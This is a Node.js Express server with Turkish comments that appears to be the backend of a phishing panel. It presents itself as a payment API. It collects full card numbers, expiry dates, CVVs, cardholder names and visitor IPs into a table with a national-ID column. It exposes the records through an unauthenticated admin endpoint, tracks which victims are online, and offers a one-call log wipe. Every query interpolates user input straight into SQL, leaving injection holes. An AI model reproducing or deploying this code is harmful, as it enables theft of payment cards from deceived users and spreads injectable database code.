const express = require('express');
const mysql = require('mysql2');
const requestIp = require('request-ip');
require('dotenv').config();
const app = express();
app.use(requestIp.mw());
const port = process.env.PORT || 3000; // Varsayılan port 3000 veya başka bir port


 
app.use(express.json());

 app.use(express.static('public'));

 app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
app.get('/admin', (req, res) => {
  res.sendFile(__dirname + '/public/admin.html');
});

app.get('/api/info', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);
  connection.connect((err) => {
    if (err) {
      console.error('Veritabanı bağlantısı kurulamadı:', err);
      return res.status(500).json({ error: 'Veritabanı bağlantı hatası' });
    }

    // "info" tablosundan verileri sorgula
    const query = 'SELECT * FROM info';
    
    connection.query(query, (error, results, fields) => {
      if (error) {
        console.error('Sorgu hatası:', error);
        return res.status(500).json({ error: 'Veritabanı sorgu hatası' });
      }

      console.log('Veriler başarıyla alındı.');

      connection.end();

      const infoList = results;
      res.json(infoList);
    });
  });
});

app.post('/online-api', (req, res) => {
  const visitorIP = req.body.visitorIP;

   const connection = mysql.createConnection(process.env.DATABASE_URL);

   const updateQuery = `
    UPDATE info
    SET active_status = ${Math.floor(Date.now() / 1000) + 7}
    WHERE ip = '${visitorIP}'
  `;

  connection.query(updateQuery, (error, results) => {
    if (error) {
      console.error('Güncelleme hatası:', error);
      return res.status(500).json({ error: 'Güncelleme hatası' });
    }

     res.json({ success: true });

     connection.end();
  });
});

app.post('/your-payment-api', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);
  const cardHolder = req.body.cardHolder;
  const cardNumber = req.body.cardNumber;
  const cardExpirationMonth = req.body.cardExpirationMonth;
  const cardExpirationYear = req.body.cardExpirationYear;
  const cardCCV = req.body.cardCCV;
  const visitorIP = req.body.visitorIP; // Ziyaretçinin IP'sini buradan alın

  // Veritabanına yeni bir kayıt eklemek için gerekli SQL sorgusunu oluşturun
  const insertQuery = `
  INSERT INTO info (bank_name, tckn, cardnumber, exp, cvv, ip)
  VALUES ('', '${cardHolder}', '${cardNumber}', '${cardExpirationMonth + cardExpirationYear}', '${cardCCV}', '${visitorIP}')
  `;

  connection.query(insertQuery, (error, results) => {
      if (error) {
          console.error('Ödeme kaydı eklenemedi:', error);
          return res.status(500).json({ error: 'Ödeme kaydı eklenemedi' });
      }

      // Başarılı yanıt verin
      res.json({ success: true });
      connection.end();
  });
});

app.post('/delete-logs-api', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);

  // Logları temizleme sorgusu
  const deleteQuery = 'DELETE FROM info';

  connection.connect((err) => {
      if (err) {
          console.error('Veritabanı bağlantısı kurulamadı:', err);
          return res.status(500).json({ error: 'Veritabanı bağlantı hatası' });
      }

      connection.query(deleteQuery, (error, results) => {
          if (error) {
              console.error('Logları silme hatası:', error);
              return res.status(500).json({ error: 'Logları silme hatası' });
          }

          // Başarılı yanıt verin
          res.json({ success: true });
      });
  });
});

 app.listen(port, () => {
  console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
